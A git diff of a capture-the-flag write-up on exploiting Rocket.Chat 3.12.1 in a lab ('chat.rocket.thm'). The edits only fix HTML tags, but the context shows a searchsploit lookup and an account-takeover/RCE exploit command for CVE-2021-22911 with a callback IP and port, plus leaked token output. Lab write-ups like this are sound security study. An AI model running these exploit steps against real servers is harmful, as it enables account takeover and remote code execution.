@@ -220,14 +220,14 @@ chat                    [Status: 200, Size: 224515, Words: 12566, Lines: 490]
 <br>
 <br>
 <br>
-<p align="center">Identified <code>rc_token</code> and <code>rc_uid</code>.</p
+<p align="center">Identified <code>rc_token</code> and <code>rc_uid</code>.</p>
 
 <img width="1132" height="275" alt="image" src="https://github.com/user-attachments/assets/c2cdc61b-93de-494b-8bb6-d43da1f5057a" />
 
 <br>
 <br>
 <br>
-<p align="center">Identified Rocket.chat 3.12.1 - NoSQL Injection to RCE (Unathenticated), <code>50108.py</code>.</p
+<p align="center">Identified Rocket.chat 3.12.1 - NoSQL Injection to RCE (Unathenticated), <code>50108.py</code>.</p>
 
 ```bash
 :~/Rocket# searchsploit rocket
@@ -291,9 +291,7 @@ Got: 9DI7uvyd0EJWJnzgE-6Wx9X3
 ```
 
 <p align="center"><code>50108.py</code> considers 2FA secret key and in our study case admin is not protected by 2FA.<br>So I execute another script<br>
-https://github.com/optionalCTF/Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911</p
-
-
+https://github.com/optionalCTF/Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911</p>
 
 ```bash
 :~/Rocket# python3 exploit.py -u 'lili@mail.com' -a 'admin@rocket.thm' -t 'http://chat.rocket.thm' -i 10.201.124.55 -p 9001
@@ -337,7 +335,6 @@ Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269
 Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d
 Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d0
 Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d0W
-
 ```
 
 
